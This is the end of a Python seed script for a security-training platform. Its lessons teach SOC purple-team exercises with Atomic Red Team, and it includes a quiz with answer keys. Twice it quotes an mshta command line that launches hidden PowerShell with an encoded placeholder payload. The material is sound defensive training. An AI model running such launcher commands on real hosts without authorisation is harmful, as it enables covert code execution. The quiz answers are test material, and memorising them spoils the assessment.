Atomic test: T1059.001-3
Expected SIEM activity:
  - Process creation events on Sysmon Event 1
  - Possible network egress to test.example.com
Expected outcome:
  - Rule "Suspicious PowerShell -enc" should fire within 5 min
  - Severity should be 'high'
  - Cross-host pivot panel should NOT show this on other hosts
Run by: <your name>
Authorised by: <CISO> + <IR lead>
```

That sentence — exactly that — goes into the exercise log and the L1 chat ahead of execution. After the exercise, the same log gets the result attached.

### Run during business hours for first attempts

You *want* detection-engineering on hand if a gap surfaces. Out-of-hours testing is a *separate* exercise validating *after-hours coverage* — it's a real exercise but it shouldn't be your first run of a TTP. First run in-hours, find the gaps, fix them, then re-run out-of-hours to validate the fix held when the team isn't watching live.

### Use a representative host

A vanilla freshly-imaged VM tells you nothing about your real telemetry. Run on a representative production-mirror host with the same EDR agent, same Sysmon config, same network egress posture as a real workstation in scope. Some orgs maintain a dedicated "purple-team labs" subnet of mirror-config hosts; that's the right pattern.

## Worked example — T1059.001 full cycle

Here's a complete cycle for *Command and Scripting Interpreter: PowerShell* using Atomic Red Team test #3 (mshta executing PowerShell).

### Prepare

ATT&CK Navigator says T1059.001 is in our threat profile (multiple sector-relevant adversaries use it). LOLBAS catalogues mshta as a viable launcher. We pick Atomic test:

```
T1059.001-3 — Mshta executes PowerShell
mshta vbscript:CreateObject("Wscript.Shell").Run(
  "powershell.exe -nop -w hidden -enc <base64-encoded payload>")(window.close)
```

The base64 payload in the public Atomic test is benign — it just runs `Get-ChildItem` on `C:\` to confirm execution. We use that payload unchanged; modifying it is a separate authorisation conversation.

### Authorise + pre-brief

Exercise notice published to L1 chat at 09:00, scheduled for 14:00. CISO + IR lead initials on the authorisation doc.

### Execute

At 14:02 we run the Atomic test on `ABACWKS042`. The exercise log captures the timestamp.

### Check telemetry — wait 30 minutes

At 14:32 we query the SIEM:

```kql
@timestamp >= "now-1h" and
host.name : "ABACWKS042" and
process.parent.name : "mshta.exe" and
process.name : "powershell.exe"
```

We expect 1 result. We get 1 result. Good — the data made it.

### Did it fire?

- Was an alert generated? Check `signal-*` index for alerts on `ABACWKS042` between 14:00–14:35
- If yes, is it the right rule? `Suspicious PowerShell -enc` should fire — not just `PowerShell launched` (too broad) or `Process Creation` (too noisy)
- If yes and right rule, what severity? Should be `high` for active LotL
- What was the latency? Time from execution (14:02) to alert created

Three possible outcomes, three different scorecard entries:

| Result | Tier | Action |
|---|---|---|
| `Suspicious PowerShell -enc` fired at 14:04 with severity `high` | 1 · Alerted | Pass. Latency 2 min, severity correct. |
| Same rule fired at 14:04 but with severity `low` | 1 with concerns | Detection-eng tunes severity for `mshta` parent up |
| No alert. Field `process.command_line` exists in winlogbeat. | 2 · Logged not alerted | Open `TuningProposal`: rule should match `mshta.exe → powershell.exe` parent-child + base64 payload |
| No alert. `process.command_line` field missing on the index. | 3 · Logged not parsed | SIEM team: fix Sysmon Event 1 parsing for command-line capture |
| Nothing in winlogbeat at all from `ABACWKS042` for that period. | 4 · Not logged | Platform team: agent dead, GPO drift, or asset isn't onboarded |

### Score and update

Whichever tier we hit, the scorecard row is:

```yaml
exercise_id: EX-2026-04-001
ttp: T1059.001
atomic_test: T1059.001-3
host: ABACWKS042
executed_at: 2026-04-27T14:02:14Z
fired_at: 2026-04-27T14:04:31Z   # or null
detection_rule: "Suspicious PowerShell -enc"  # or null
severity_assigned: high
severity_correct: true
latency_seconds: 137
fidelity_tier: 1
notes: "Clean catch. Latency under 5 min target."
```

That row goes in the scorecard. Six months in, you have ~25 of these and can answer the CISO with: *"On 22 of 25 in-scope TTPs we have Tier 1 detection. The three Tier 2 gaps are all on cloud-identity TTPs and detection-eng has the rule work in flight."* That's a defensible posture statement. *"We did a pentest and got rooted in 4 hours"* is not.

## Eight common mistakes when starting purple-team programs

These are real failure modes from actual programs. Avoid them all.

1. **Chaining TTPs in one exercise.** As covered — can't attribute findings. Always atomic.
2. **No telemetry-ingestion wait.** Declares Tier 4 gaps that are actually 30-second pipeline lag.
3. **Running on freshly-imaged VMs.** Tells you nothing about your real production telemetry posture.
4. **Skipping the pre-brief.** Wastes L1 time confirming the test isn't a real attack.
5. **Conflating detection gaps with logging gaps.** Pisses off detection-eng (you blamed them for a parsing issue) and lets the SIEM team off the hook (they should have fixed the parser).
6. **Running unsanctioned tests "to prove a point".** Career-limiting move. Always have written authorisation.
7. **Reporting binary pass/fail.** Loses fidelity-tier nuance. The scorecard needs all four tiers visible.
8. **Not closing the loop.** A gap found in March that's still a gap in September means the program isn't producing detection improvements. Set a 30-day follow-up cadence on every gap.

## Glossary

- **Adversary emulation** — Controlled execution of adversary TTPs to validate the SOC's ability to detect them. *Detection-validation*, not pentesting.
- **Atomic Red Team** — Open-source library of single-TTP tests. ~600 tests across most ATT&CK sub-techniques. `atomicredteam.io`.
- **Caldera** — MITRE's adversary-emulation platform. Heavier than Atomic; chains TTPs into emulated campaigns. Useful for chained-attack exercises *after* atomic coverage is mature.
- **TTP** — Tactic, Technique, Procedure. Specific adversary behaviour, usually a MITRE ATT&CK sub-technique ID.
- **Fidelity tier** — Where the detection landed on the four-tier scale (Alerted / Logged-not-alerted / Unparsed / Not-logged). Determines which team owns the fix.
- **Latency** — Time from TTP execution to alert creation. Sub-5-minutes is the common target for live-triage TTPs; 30-minutes acceptable for slow-burn TTPs (data exfiltration etc.).
- **Scorecard** — Persistent record of every exercise's TTP, host, fidelity tier, latency, and remediation status. The artefact you defend the SOC budget with.

## Further reading

- **Atomic Red Team** — `atomicredteam.io`. Start with the test catalogue filtered by your sector's threat actors.
- **MITRE ATT&CK Evaluations** — `attackevals.mitre.org`. MITRE benchmarks vendor EDR products against real APT TTPs. Reading the eval reports for *your* EDR is humbling and useful.
- **Caldera** — `caldera.mitre.org`. Adversary-emulation platform. Pick this up *after* you've done six months of Atomic-driven exercises.
- **PEAK Threat Hunting Framework** — see L2 *Threat Hunting with KQL* further reading. Hunting and emulation are the two sides of detection-validation.
- **Red Canary's annual Threat Detection Report** — empirical data on which TTPs actually got used in real intrusions last year. Use it to prioritise your exercise curriculum.

---

When you're ready, take the **Running an Atomic test for T1059.001** quiz to lock in the analysis flow.
""",
    )

    l2 = _add_lesson(
        session, mod, order=2, title="Running an Atomic test for T1059.001 — quiz",
        lesson_type=LessonType.QUIZ, duration_min=15,
        content_md="""
## A worked Atomic Red Team exercise

You've been authorised to emulate **T1059.001 — Command and Scripting
Interpreter: PowerShell**. Atomic Red Team's catalogue gives you ~14
tests for this technique. You pick:

> **T1059.001-3 — Mshta executes PowerShell**
>
> ```cmd
> mshta vbscript:CreateObject("Wscript.Shell").Run("powershell.exe -nop -w hidden -enc <base64>")(window.close)
> ```

You execute it on `ABACWKS042`, log the timestamp, and now ask:

1. Did the SIEM fire on it?
2. If yes, with what fidelity?
3. If no, *what* should have fired?

Take the quiz to lock in the analysis flow.
""",
    )
    _add_q(session, l2, order=1, kind=QuestionKind.SINGLE,
        stem_md="No alert fires from the SIEM. You query winlogbeat and find that `process.command_line` *does* contain the payload, but no rule matched. What's the right ATT&CK fidelity tier and what's the next action?",
        options=[
            {"value": "alerted_no_action", "label": "Alerted — score latency, no action needed"},
            {"value": "logged_open_tuning", "label": "Logged but not alerted → open a TuningProposal for the detection gap"},
            {"value": "unparsed_fix_parser", "label": "Logged but unparsed → fix the parser to expose process.command_line"},
            {"value": "not_logged_telemetry", "label": "Not logged → escalate to the platform team"},
        ],
        correct="logged_open_tuning",
        explanation_md="**Logged but not alerted.** The data was there (you confirmed the field exists in winlogbeat) but no rule matched. That's a detection-engineering gap — the right action is opening a `TuningProposal` ticket so the detection-eng team writes a new rule (or extends an existing one). Don't conflate it with a *parsing* gap (where the field doesn't exist) or a *telemetry* gap (where the data source isn't collected at all).",
        points=2,
    )
    _add_q(session, l2, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following are valid pre-execution sanity checks? (Pick all that apply.)",
        options=[
            {"value": "ciso_auth", "label": "CISO + IR have signed off on the technique + window"},
            {"value": "soc_pre_brief", "label": "L1 shift has been told the test is happening so they don't open an investigation"},
            {"value": "rollback", "label": "You have a documented rollback for any persistence the test creates"},
            {"value": "production_target", "label": "You're running on a representative production host (not a freshly-imaged VM)"},
            {"value": "shift_off_hours", "label": "You're running outside business hours so the SOC isn't busy"},
        ],
        correct=["ciso_auth", "soc_pre_brief", "rollback", "production_target"],
        explanation_md="The first four are mandatory. *Off-hours* is wrong for first-attempt purple teaming — you actively *want* detection-eng on hand if you find a gap. Out-of-hours testing is a separate exercise validating after-hours coverage and should follow a successful in-hours run. The *production-host* one is sometimes contentious; prefer a representative production-mirror host where possible, but a vanilla golden-image VM doesn't tell you anything about your real telemetry.",
        points=3,
    )
    _add_q(session, l2, order=3, kind=QuestionKind.SHORTANSWER,
        stem_md="What's the MITRE ATT&CK technique ID for the parent technique 'Command and Scripting Interpreter'? (Format: T followed by 4 digits.)",
        options=None,
        correct=["T1059", "t1059"],
        explanation_md="**T1059** is the parent technique. Sub-techniques are T1059.001 (PowerShell), T1059.003 (Windows Command Shell), T1059.005 (Visual Basic), etc. When recording emulation results, capture both the parent and the sub-technique — your coverage map needs both.",
        points=1,
    )
    _add_q(session, l2, order=4, kind=QuestionKind.SINGLE,
        stem_md="A detection rule fires, but with severity *informational* and 4 hours after the event. What do you record on the exercise scorecard?",
        options=[
            {"value": "pass", "label": "Pass — detection fired"},
            {"value": "fail_severity", "label": "Fail — wrong severity"},
            {"value": "pass_with_concerns", "label": "Pass with concerns — record latency (4h is too slow) and fidelity (informational underweights an active LotL)"},
            {"value": "fail_completely", "label": "Fail completely — late & wrong severity is no different from missing"},
        ],
        correct="pass_with_concerns",
        explanation_md="**Pass with concerns.** The detection *did* fire, which is meaningful — but a 4-hour latency and informational severity for an active LotL technique are both quality issues. Record both on the scorecard so detection-engineering knows what to fix: tune severity *up*, and investigate why the rule took 4 hours (data ingestion lag? aggregation window? SIEM throughput?). Calling it a complete fail loses the partial-credit signal that something is monitoring the right field.",
        points=2,
    )

    print(f"  L3: {course.title} — 1 module, 2 lessons")
    return course


# ── Main ─────────────────────────────────────────────────────────────────


def main() -> None:
    engine = get_engine()
    factory = get_session_factory(engine)
    session = factory()
    try:
        admin = _admin_user(session)
        if not admin:
            print("[error] no users in DB — create at least one before seeding courses")
            return
        _cleanup(session)
        print("[seed] courses…")
        c1 = _seed_l1(session, admin.id)
        c2 = _seed_l2(session, admin.id)
        c3 = _seed_l3(session, admin.id)
        # L2 prerequisite is L1; L3 prerequisite is L2
        c2.prerequisite_course_id = c1.id
        c3.prerequisite_course_id = c2.id
        session.commit()

        print()
        print("─" * 60)
        print("DEMO COURSES SEEDED")
        print("─" * 60)
        print(f"  L1: /courses/{c1.slug}")
        print(f"  L2: /courses/{c2.slug}  (requires L1)")
        print(f"  L3: /courses/{c3.slug}  (requires L2)")
        print()
        print("Try: http://localhost:8000/courses")
    except Exception:
        session.rollback()
        raise
    finally:
        session.close()


if __name__ == "__main__":
    main()
